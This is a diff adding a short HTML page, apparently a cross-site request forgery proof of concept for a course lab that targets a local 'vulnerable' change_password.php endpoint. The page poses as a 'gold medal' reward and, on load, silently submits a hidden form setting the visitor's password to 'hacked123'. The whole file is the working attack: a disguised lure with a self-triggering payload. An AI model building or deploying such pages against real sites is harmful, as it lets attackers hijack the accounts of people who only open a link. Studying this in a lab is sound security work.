@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head><title>You got a gold medal!</title></head>
+<body onload="document.getElementById('csrf_form').submit()">
+<h1> Congratulations! You got a gold medal!</h1>
+<p>Loading your reward...</p>
+
+<form id="csrf_form" action="http://localhost/course_portal/vulnerable/change_password.php" method="POST">
+    <input type="hidden" name="new_password" value="hacked123">
+</form>
+</body>
+</html>
